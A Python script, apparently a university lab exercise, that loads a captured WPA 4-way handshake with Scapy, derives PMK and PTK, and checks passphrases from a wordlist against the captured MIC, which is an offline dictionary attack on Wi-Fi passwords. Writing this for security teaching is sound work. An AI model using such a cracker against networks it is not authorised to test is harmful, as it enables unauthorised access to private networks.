#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Scapy based aircrack
"""

__author__      = "Godi Matthieu et Issolah Maude"
__copyright__   = "Copyright 2022, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 	= "abraham.rubinstein@heig-vd.ch"
__status__ 	= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import utils

# File containing the list of potentials passphrases
FILENAME = "wordlist.txt"

# Read capture file -- it contains assoReq, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

assoReq = utils.first_assoReq(wpa)
hs1 = utils.handshake_first_package(wpa)
hs2 = hs1 + 1
hs4 = hs1 + 3

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = assoReq.info.decode()
APmac       = a2b_hex(wpa[hs1].addr2.replace(":", "")) 
Clientmac   = a2b_hex(wpa[hs1].addr1.replace(":", "")) 

# Authenticator and Supplicant Nonces
ANonce      = wpa[hs1].load[13:45] 
SNonce      = Dot11Elt(wpa[hs2]).load[65:97]

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = Dot11Elt(wpa[hs4]).load[129:-2].hex()

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce)

data        = a2b_hex(Dot11Elt(wpa[hs4]).load[48:].hex().replace(mic_to_test, "0"*len(mic_to_test)))

ssid = str.encode(ssid)

# Open file
wordlist = open(FILENAME, "r")

# We test each passphrase in the file
for word in wordlist.readlines():
    # To remove the end of line character
    wrd = word.strip()
    passphrase = str.encode(wrd) 

    # Get pmk
    pmk = pbkdf2(hashlib.sha1,passphrase, ssid, 4096, 32)

    # Get ptk
    ptk = utils.customPRF512(pmk,str.encode(A),B)

    # Get mic
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    # If the computed mic and the one from the capture matche, we print the passphrase
    if mic.hexdigest()[:-8] == mic_to_test:
        print ("Passphrase found : " + wrd)
        print ("\nResults of the key expansion")
        print ("=============================")
        print ("PMK:\t\t",pmk.hex(),"\n")
        print ("PTK:\t\t",ptk.hex(),"\n")
        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
        print ("TK:\t\t",ptk[32:48].hex(),"\n")
        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
        print ("MIC:\t\t",mic.hexdigest(),"\n")
        exit()# Passphrase found -> exit
# No passphrase found
print("No matching passphrase")